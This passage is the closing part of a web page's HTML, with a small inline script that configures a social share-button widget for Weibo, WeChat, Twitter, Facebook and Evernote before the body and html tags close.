      pbOptions = {};
      
        pbOptions.iconStyle = "default";
      
        pbOptions.boxForm = "horizontal";
      
        pbOptions.position = "bottomCenter";
      
        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
      
      new needShareButton('#needsharebutton-postbottom', pbOptions);
    
    
  </script>


  

  

  

  

</body>
</html>
